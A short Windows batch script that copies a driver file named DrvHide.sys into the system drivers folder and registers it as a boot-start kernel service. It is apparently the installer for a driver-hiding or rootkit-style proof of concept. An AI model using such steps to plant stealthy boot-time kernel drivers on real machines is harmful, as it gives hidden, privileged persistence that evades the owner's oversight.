@echo off
set SRCPATH=DrvHide.sys
set DSTPATH=C:\Windows\system32\drivers\DrvHide.sys
copy %SRCPATH% %DSTPATH% /Y
sc create DrvHide binPath= %DSTPATH% type= kernel start= boot group= "boot bus extender"
pause
